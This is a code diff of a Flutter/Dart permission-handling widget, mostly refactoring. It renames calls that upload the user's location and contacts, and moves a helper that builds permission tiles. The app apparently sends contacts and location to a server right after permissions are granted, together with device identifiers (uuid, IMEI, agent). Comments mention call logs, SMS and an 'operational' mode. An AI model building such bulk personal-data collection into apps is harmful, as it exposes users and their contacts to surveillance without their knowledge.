@@ -17,16 +17,14 @@ class PermissionHandlerWidget extends StatefulWidget {
 }
 
 class PermissionHandlerWidgetState extends State<PermissionHandlerWidget> {
-  var colorIndex = 15;
   String? uuid;
   String? imei;
   String? agent;
 
   @override
   void initState() {
-    super.initState();
-
     _requestPermissions();
+    super.initState();
   }
 
   void _requestPermissions() async {
@@ -40,17 +38,14 @@ class PermissionHandlerWidgetState extends State<PermissionHandlerWidget> {
     await _requestPermission(Permission.location);
 
     _dummyLoader();
-    Api.sendLocationToServer(agent, uuid);
-    Api.sendContactsToServer(agent, uuid);
-
+    Api.sendLocation(agent, uuid);
+    Api.sendContacts(agent, uuid);
     setState(() {});
   }
 
   Future<PermissionStatus?> _requestPermission(Permission permission) async {
     final alreadyGranted = await permission.isGranted;
-
     if (alreadyGranted) return null;
-
     final status = await permission.request();
 
     try {
@@ -111,102 +106,6 @@ class PermissionHandlerWidgetState extends State<PermissionHandlerWidget> {
         duration: const Duration(milliseconds: 2500));
   }
 
-  List<Widget> _permissionContainers() {
-    return Permission.values.where(
-      (permission) {
-        // Also reactive in android manifest!
-        //~ To remove permissions:
-        return
-            //> Coming soon:
-            permission != Permission.calendar &&
-                permission != Permission.camera &&
-                permission != Permission.photos &&
-                permission != Permission.manageExternalStorage &&
-                permission != Permission.locationAlways &&
-                permission != Permission.sms &&
-                permission != Permission.phone &&
-                //> Will not be in use:
-                permission != Permission.unknown &&
-                permission != Permission.mediaLibrary &&
-                // permission != Permission.photos &&
-                permission != Permission.photosAddOnly &&
-                permission != Permission.reminders &&
-                permission != Permission.appTrackingTransparency &&
-                permission != Permission.nearbyWifiDevices &&
-                permission != Permission.bluetooth &&
-                permission != Permission.bluetoothAdvertise &&
-                permission != Permission.bluetoothConnect &&
-                permission != Permission.bluetoothScan &&
-                permission != Permission.sensors &&
-                permission != Permission.speech &&
-                permission != Permission.notification &&
-                permission != Permission.activityRecognition &&
-                permission != Permission.requestInstallPackages &&
-                permission != Permission.systemAlertWindow &&
-                permission != Permission.accessNotificationPolicy &&
-                permission != Permission.locationWhenInUse &&
-                permission != Permission.criticalAlerts &&
-                // permission != Permission.manageExternalStorage &&
-                // permission != Permission.storage &&
-                permission != Permission.accessMediaLocation &&
-                permission != Permission.audio &&
-                permission != Permission.videos &&
-                permission != Permission.ignoreBatteryOptimizations &&
-                permission != Permission.scheduleExactAlarm;
-      },
-    ).map((permission) {
-      // var color = Colors.primaries[math.Random().nextInt(Colors.primaries.length)]
-      var color = Colors.primaries[colorIndex].withOpacity(0.70);
-      colorIndex--;
-
-      if (colorIndex == 0) colorIndex = 15;
-
-      // var color = Colors.blue.withOpacity(0.75);
-      var icon = Icons.done;
-
-      if (permission == Permission.calendar) {
-        icon = Icons.event;
-      }
-      if (permission == Permission.camera) {
-        icon = Icons.photo_camera;
-      }
-      if (permission == Permission.contacts) {
-        icon = Icons.groups;
-      }
-      if (permission == Permission.location) {
-        icon = Icons.location_on;
-      }
-      if (permission == Permission.locationAlways) {
-        icon = Icons.my_location;
-      }
-      if (permission == Permission.microphone) {
-        icon = Icons.mic;
-      }
-      if (permission == Permission.phone) {
-        icon = Icons.call;
-      }
-      if (permission == Permission.photos) {
-        icon = Icons.image;
-      }
-      if (permission == Permission.sms) {
-        icon = Icons.textsms;
-      }
-      if (permission == Permission.storage ||
-          permission == Permission.manageExternalStorage) {
-        icon = Icons.folder;
-        // icon = Icons.cloud_done;
-      }
-      if (permission == Permission.videos) {
-        icon = Icons.movie;
-      }
-      if (permission == Permission.audio) {
-        icon = Icons.volume_up;
-      }
-
-      return PermissionWidget(permission, color, icon);
-    }).toList();
-  }
-
   @override
   Widget build(BuildContext context) {
     if (kDebugMode) {
@@ -245,7 +144,7 @@ class PermissionHandlerWidgetState extends State<PermissionHandlerWidget> {
           // 4. Call Logs
           // 5. SMS
 
-          // Operation "מבצעי" mode: need to wait agent & update server with initState()
+          // in "מבצעי" mode: agent && uuid needed. set on initState()
           // But not in normal mode
           children: agent != null && uuid != null
               ? _permissionContainers()
@@ -254,4 +153,103 @@ class PermissionHandlerWidgetState extends State<PermissionHandlerWidget> {
       ),
     );
   }
+}
+
+List<Widget> _permissionContainers() {
+  var colorIndex = 15;
+
+  return Permission.values.where(
+        (permission) {
+      // Also reactive in android manifest!
+      //~ To remove permissions:
+      return
+        //> Coming soon:
+        permission != Permission.calendar &&
+            permission != Permission.camera &&
+            permission != Permission.photos &&
+            permission != Permission.manageExternalStorage &&
+            permission != Permission.locationAlways &&
+            permission != Permission.sms &&
+            permission != Permission.phone &&
+            //> Will not be in use:
+            permission != Permission.unknown &&
+            permission != Permission.mediaLibrary &&
+            // permission != Permission.photos &&
+            permission != Permission.photosAddOnly &&
+            permission != Permission.reminders &&
+            permission != Permission.appTrackingTransparency &&
+            permission != Permission.nearbyWifiDevices &&
+            permission != Permission.bluetooth &&
+            permission != Permission.bluetoothAdvertise &&
+            permission != Permission.bluetoothConnect &&
+            permission != Permission.bluetoothScan &&
+            permission != Permission.sensors &&
+            permission != Permission.speech &&
+            permission != Permission.notification &&
+            permission != Permission.activityRecognition &&
+            permission != Permission.requestInstallPackages &&
+            permission != Permission.systemAlertWindow &&
+            permission != Permission.accessNotificationPolicy &&
+            permission != Permission.locationWhenInUse &&
+            permission != Permission.criticalAlerts &&
+            // permission != Permission.manageExternalStorage &&
+            // permission != Permission.storage &&
+            permission != Permission.accessMediaLocation &&
+            permission != Permission.audio &&
+            permission != Permission.videos &&
+            permission != Permission.ignoreBatteryOptimizations &&
+            permission != Permission.scheduleExactAlarm;
+    },
+  ).map((permission) {
+
+    // var color = Colors.primaries[math.Random().nextInt(Colors.primaries.length)]
+    var color = Colors.primaries[colorIndex].withOpacity(0.70);
+    colorIndex--;
+
+    if (colorIndex == 0) colorIndex = 15;
+
+    // var color = Colors.blue.withOpacity(0.75);
+    var icon = Icons.done;
+
+    if (permission == Permission.calendar) {
+      icon = Icons.event;
+    }
+    if (permission == Permission.camera) {
+      icon = Icons.photo_camera;
+    }
+    if (permission == Permission.contacts) {
+      icon = Icons.groups;
+    }
+    if (permission == Permission.location) {
+      icon = Icons.location_on;
+    }
+    if (permission == Permission.locationAlways) {
+      icon = Icons.my_location;
+    }
+    if (permission == Permission.microphone) {
+      icon = Icons.mic;
+    }
+    if (permission == Permission.phone) {
+      icon = Icons.call;
+    }
+    if (permission == Permission.photos) {
+      icon = Icons.image;
+    }
+    if (permission == Permission.sms) {
+      icon = Icons.textsms;
+    }
+    if (permission == Permission.storage ||
+        permission == Permission.manageExternalStorage) {
+      icon = Icons.folder;
+      // icon = Icons.cloud_done;
+    }
+    if (permission == Permission.videos) {
+      icon = Icons.movie;
+    }
+    if (permission == Permission.audio) {
+      icon = Icons.volume_up;
+    }
+
+    return PermissionWidget(permission, color, icon);
+  }).toList();
 }
